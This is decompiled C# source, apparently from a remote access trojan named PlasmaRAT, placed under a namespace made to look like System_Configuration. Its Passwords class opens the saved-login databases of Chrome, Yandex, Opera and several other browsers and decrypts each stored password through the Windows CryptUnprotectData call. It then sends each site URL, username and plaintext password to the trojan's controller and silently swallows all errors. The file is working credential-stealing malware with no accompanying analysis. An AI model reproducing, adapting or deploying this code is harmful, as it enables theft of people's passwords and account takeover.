using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace System_Configuration
{
	// Token: 0x02000014 RID: 20
	[StandardModule]
	internal sealed class Passwords
	{
		// Token: 0x06000083 RID: 131 RVA: 0x0000868C File Offset: 0x0000688C
		public static void passwordsz()
		{
			try
			{
				string[] array = new string[]
				{
					Environment.GetEnvironmentVariable("LocalAppData") + "\\Google\\Chrome\\User Data\\Default\\Login Data",
					Environment.GetEnvironmentVariable("LocalAppData") + "\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data",
					Environment.GetEnvironmentVariable("LocalAppData") + "\\Kometa\\User Data\\Default\\Login Data",
					Environment.GetEnvironmentVariable("LocalAppData") + "\\Amigo\\User\\User Data\\Default\\Login Data",
					Environment.GetEnvironmentVariable("LocalAppData") + "\\Torch\\User Data\\Default\\Login Data",
					Environment.GetEnvironmentVariable("LocalAppData") + "\\Orbitum\\User Data\\Default\\Login Data",
					Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Login Data"
				};
				foreach (string text in array)
				{
					SQLiteHandler sqliteHandler = new SQLiteHandler(text);
					sqliteHandler.ReadTable("logins");
					if (File.Exists(text))
					{
						int num = 0;
						int num2 = sqliteHandler.GetRowCount() - 1;
						for (int j = num; j <= num2; j++)
						{
							string value = sqliteHandler.GetValue(j, "origin_url");
							string value2 = sqliteHandler.GetValue(j, "username_value");
							string text2 = Passwords.Decrypt(Encoding.Default.GetBytes(sqliteHandler.GetValue(j, "password_value")));
							if (Operators.CompareString(value2, "", false) != 0 & Operators.CompareString(text2, "", false) != 0)
							{
								Thread.Sleep(2000);
								PlasmaRAT.Send(string.Concat(new string[]
								{
									"PASS*",
									value,
									"*",
									value2,
									"*",
									text2,
									"*"
								}));
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000084 RID: 132
		[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref Passwords.DATA_BLOB pDataIn, string szDataDescr, ref Passwords.DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref Passwords.CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, int dwFlags, ref Passwords.DATA_BLOB pDataOut);

		// Token: 0x06000085 RID: 133 RVA: 0x000088C4 File Offset: 0x00006AC4
		public static string Decrypt(byte[] Datas)
		{
			string result;
			try
			{
				Passwords.DATA_BLOB data_BLOB = default(Passwords.DATA_BLOB);
				Passwords.DATA_BLOB data_BLOB2 = default(Passwords.DATA_BLOB);
				GCHandle gchandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
				data_BLOB.pbData = gchandle.AddrOfPinnedObject();
				data_BLOB.cbData = Datas.Length;
				gchandle.Free();
				string szDataDescr = null;
				Passwords.DATA_BLOB data_BLOB4;
				Passwords.DATA_BLOB data_BLOB3 = data_BLOB4;
				IntPtr intPtr;
				IntPtr pvReserved = intPtr;
				Passwords.CRYPTPROTECT_PROMPTSTRUCT cryptprotect_PROMPTSTRUCT2;
				Passwords.CRYPTPROTECT_PROMPTSTRUCT cryptprotect_PROMPTSTRUCT = cryptprotect_PROMPTSTRUCT2;
				Passwords.CryptUnprotectData(ref data_BLOB, szDataDescr, ref data_BLOB3, pvReserved, ref cryptprotect_PROMPTSTRUCT, 0, ref data_BLOB2);
				byte[] array = new byte[data_BLOB2.cbData + 1];
				Marshal.Copy(data_BLOB2.pbData, array, 0, data_BLOB2.cbData);
				string @string = Encoding.Default.GetString(array);
				result = @string.Substring(0, @string.Length - 1);
			}
			catch (Exception ex)
			{
			}
			return result;
		}

		// Token: 0x04000070 RID: 112
		public static string cPass;

		// Token: 0x02000054 RID: 84
		[Flags]
		public enum CryptProtectPromptFlags
		{
			// Token: 0x0400017D RID: 381
			CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
			// Token: 0x0400017E RID: 382
			CRYPTPROTECT_PROMPT_ON_PROTECT = 2
		}

		// Token: 0x02000055 RID: 85
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct CRYPTPROTECT_PROMPTSTRUCT
		{
			// Token: 0x0400017F RID: 383
			public int cbSize;

			// Token: 0x04000180 RID: 384
			public Passwords.CryptProtectPromptFlags dwPromptFlags;

			// Token: 0x04000181 RID: 385
			public IntPtr hwndApp;

			// Token: 0x04000182 RID: 386
			public string szPrompt;
		}

		// Token: 0x02000056 RID: 86
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct DATA_BLOB
		{
			// Token: 0x04000183 RID: 387
			public int cbData;

			// Token: 0x04000184 RID: 388
			public IntPtr pbData;
		}
	}
}
